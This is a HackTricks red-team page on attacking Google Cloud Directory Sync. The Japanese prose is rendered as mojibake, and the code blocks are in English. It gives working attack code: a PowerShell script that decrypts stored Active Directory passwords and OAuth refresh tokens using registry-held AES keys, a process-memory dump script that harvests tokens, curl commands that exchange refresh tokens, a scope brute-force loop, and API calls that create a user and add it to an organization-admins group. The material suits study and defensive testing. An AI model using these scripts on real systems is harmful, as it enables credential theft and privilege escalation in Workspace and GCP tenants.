# GCDS - Google Cloud Directory Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

ã“ã‚Œã¯ã€**ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’Workspaceã«åŒæœŸã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ„ãƒ¼ãƒ«**ã§ã™ï¼ˆåŸ·ç­†æ™‚ç‚¹ã§ã¯ãã®é€†ã¯ã§ãã¾ã›ã‚“ï¼‰ã€‚

ã“ã‚Œã¯ã€**Workspaceã®ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ç‰¹æ¨©ã®ã‚ã‚‹ADãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±**ã‚’å¿…è¦ã¨ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹ãŸã‚ã€èˆˆå‘³æ·±ã„ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€æ™‚æŠ˜ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åŒæœŸã—ã¦ã„ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚µãƒ¼ãƒãƒ¼å†…ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% hint style="info" %}
**`config-manager.exe`**ãƒã‚¤ãƒŠãƒªã«å¯¾ã—ã¦**MitM**ã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€`config.manager.vmoptions`ãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®è¡Œã‚’è¿½åŠ ã—ã¦ãã ã•ã„: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ã¯**GCDS**ã‚’æ¤œå‡ºã—ã€æ§‹æˆã«é–¢ã™ã‚‹æƒ…å ±ã‚„**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŠã‚ˆã³æš—å·åŒ–ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±**ã‚’å–å¾—ã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

ã¾ãŸã€GCDSã¯ADã‹ã‚‰Workspaceã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’åŒæœŸã—ãªã„ã“ã¨ã«ã‚‚æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ä½•ã‹ã‚ã‚Œã°ã€Workspaceã§æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«ãƒ©ãƒ³ãƒ€ãƒ ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã ã‘ã§ã™ã€‚ä»¥ä¸‹ã®ç”»åƒã®ã‚ˆã†ã«:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - ãƒ‡ã‚£ã‚¹ã‚¯ãƒˆãƒ¼ã‚¯ãƒ³ã¨ADè³‡æ ¼æƒ…å ±

ãƒã‚¤ãƒŠãƒª`config-manager.exe`ï¼ˆGUIã‚’æŒã¤ä¸»è¦ãªGCDSãƒã‚¤ãƒŠãƒªï¼‰ã¯ã€æ§‹æˆã•ã‚ŒãŸã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®è³‡æ ¼æƒ…å ±ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã€ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹ã‚’ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**xmlãƒ•ã‚¡ã‚¤ãƒ«**ã«ä¿å­˜ã—ã¾ã™ã€‚ä¿å­˜å…ˆã¯**`C:\Program Files\Google Cloud Directory Sync`**ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼å†…ã®**`Untitled-1.xml`**ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ãŸã ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®`Documents`ã‚„**ä»–ã®ä»»æ„ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼**ã«ä¿å­˜ã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚

ã•ã‚‰ã«ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒª**`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`**å†…ã®ã‚­ãƒ¼**`open.recent`**ã«ã¯ã€æœ€è¿‘é–‹ã‹ã‚ŒãŸã™ã¹ã¦ã®æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆxmlï¼‰ã®ãƒ‘ã‚¹ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ãã‚Œã‚’ç¢ºèªã—ã¦è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®æœ€ã‚‚èˆˆå‘³æ·±ã„æƒ…å ±ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€**refresh** **token** ã¨ **password** ã¯ã€ãƒ©ãƒ³ãƒ€ãƒ ã«ç”Ÿæˆã•ã‚ŒãŸã‚­ãƒ¼ã¨IVã‚’ä½¿ç”¨ã—ã¦ **AES CBC** ã§ **æš—å·åŒ–** ã•ã‚Œã¦ãŠã‚Šã€**`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** ã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ï¼ˆ**`prefs`** Javaãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒè¨­å®šã‚’ä¿å­˜ã™ã‚‹å ´æ‰€ï¼‰ã€‚æ–‡å­—åˆ—ã‚­ãƒ¼ **`/Encryption/Policy/V2.iv`** ã¨ **`/Encryption/Policy/V2.key`** ã«base64å½¢å¼ã§ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

<details>

<summary>ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã®Powershellã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
ã“ã®æƒ…å ±ã¯ã€**`C:\Program Files\Google Cloud Directory Sync`** ã® **`DirSync.jar`** ã®Javaã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã€`exportkeys` ã¨ã„ã†æ–‡å­—åˆ—ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ç¢ºèªå¯èƒ½ã§ã™ï¼ˆã“ã‚Œã¯ãƒã‚¤ãƒŠãƒª **`upgrade-config.exe`** ãŒã‚­ãƒ¼ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ãŸã‚ã«æœŸå¾…ã™ã‚‹CLIãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ã™ï¼‰ã€‚
{% endhint %}

PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ä»£ã‚ã‚Šã«ã€ãƒã‚¤ãƒŠãƒª **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** ã‚’ `-exportKeys` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨å…±ã«ä½¿ç”¨ã—ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‹ã‚‰ **Key** ã¨ **IV** ã‚’16é€²æ•°ã§å–å¾—ã—ã€ãã®å¾Œã€AES/CBCã¨ãã®ã‚­ãƒ¼ãŠã‚ˆã³IVã‚’ä½¿ç”¨ã—ã¦æƒ…å ±ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«CyberChefã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

### GCDS - ãƒ¡ãƒ¢ãƒªã‹ã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒ€ãƒ³ãƒ—

GCPWã¨åŒæ§˜ã«ã€`config-manager.exe` ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¡ãƒ¢ãƒªã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆã“ã‚Œã¯GCDSã®GUIã‚’æŒã¤ãƒ¡ã‚¤ãƒ³ãƒã‚¤ãƒŠãƒªã®åå‰ã§ã™ï¼‰ã®ã§ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã™ã§ã«ç”Ÿæˆã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€‚\
ADã«è¨­å®šã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨æ€ã„ã¾ã™ã€‚

<details>

<summary>config-manager.exeãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒ€ãƒ³ãƒ—ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œç´¢</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹

ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§æŒ‡å®šã•ã‚ŒãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - ã‚¹ã‚³ãƒ¼ãƒ—

{% hint style="info" %}
ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒã£ã¦ã„ã¦ã‚‚ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®ãŸã‚ã«ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹**ã‚¹ã‚³ãƒ¼ãƒ—ã®ã¿ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãã‚‹**ã‹ã‚‰ã§ã™ã€‚

ã¾ãŸã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã™ã¹ã¦ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§æœ‰åŠ¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€GCSDã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã™ã¹ã¦ã®å¯èƒ½ãªOAuthã‚¹ã‚³ãƒ¼ãƒ—ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€`refresh_token`ã‚’ä½¿ç”¨ã—ã¦`access_token`ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<details>

<summary>ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ãã—ã¦ã€ã“ã‚ŒãŒåŸ·ç­†æ™‚ã«å¾—ã‚‰ã‚ŒãŸå‡ºåŠ›ã§ã™ï¼š
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã€`gcp-organization-admins` ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã—ã¦ GCP ã§ã®æ¨©é™æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«Super Aminãƒ­ãƒ¼ãƒ«ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€**ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã«å¿…è¦ãªã‚¹ã‚³ãƒ¼ãƒ—ãŒä¸è¶³ã—ã¦ã„ã‚‹**ãŸã‚ã§ã™ã€‚
{% endhint %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
